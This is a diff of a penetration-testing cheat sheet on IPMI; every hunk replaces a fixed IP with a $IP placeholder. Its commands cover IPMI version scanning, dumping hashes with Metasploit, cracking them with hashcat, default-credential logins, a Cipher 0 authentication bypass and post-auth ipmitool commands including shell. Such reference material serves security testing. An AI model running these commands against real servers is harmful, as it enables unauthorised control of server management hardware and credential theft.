@@ -8,7 +8,7 @@
 ## Enumeration
 
 ```bash
-nmap -sU -p 623 --script ipmi-version 10.10.10.10
+nmap -sU -p 623 --script ipmi-version $IP
 ```
 
 ---
@@ -18,7 +18,7 @@ nmap -sU -p 623 --script ipmi-version 10.10.10.10
 ```bash
 msfconsole
 use auxiliary/scanner/ipmi/ipmi_dumphashes
-set RHOSTS 10.10.10.10
+set RHOSTS $IP
 run
 ```
 
@@ -31,7 +31,7 @@ hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
 ## Default Credentials
 
 ```bash
-ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin chassis status
+ipmitool -I lanplus -H $IP -U admin -P admin chassis status
 ```
 
 ---
@@ -41,7 +41,7 @@ ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin chassis status
 IPMI 2.0 sometimes accepts authentication with Cipher 0, which allows any password.
 
 ```bash
-ipmitool -I lanplus -C 0 -H 10.10.10.10 -U ADMIN -P anything user list
+ipmitool -I lanplus -C 0 -H $IP -U ADMIN -P anything user list
 ```
 
 ---
@@ -49,10 +49,10 @@ ipmitool -I lanplus -C 0 -H 10.10.10.10 -U ADMIN -P anything user list
 ## Post-Auth Commands
 
 ```bash
-ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> user list
-ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sensor
-ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sel list
-ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> shell
+ipmitool -I lanplus -H $IP -U <user> -P <pass> user list
+ipmitool -I lanplus -H $IP -U <user> -P <pass> sensor
+ipmitool -I lanplus -H $IP -U <user> -P <pass> sel list
+ipmitool -I lanplus -H $IP -U <user> -P <pass> shell
 ```
 
 !!! tip "Real-world"
